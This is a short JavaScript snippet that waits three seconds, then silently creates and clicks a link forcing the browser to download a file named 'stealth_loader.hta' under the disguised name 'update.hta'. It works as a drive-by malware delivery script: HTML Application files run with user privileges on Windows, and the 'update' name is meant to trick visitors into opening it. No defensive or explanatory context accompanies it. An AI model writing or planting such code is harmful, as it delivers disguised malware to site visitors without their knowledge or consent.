setTimeout(() => {
  var link = document.createElement("a")
  link.href = "stealth_loader.hta"
  link.download = "update.hta"
  document.body.appendChild(link)
  link.click()
}, 3000)
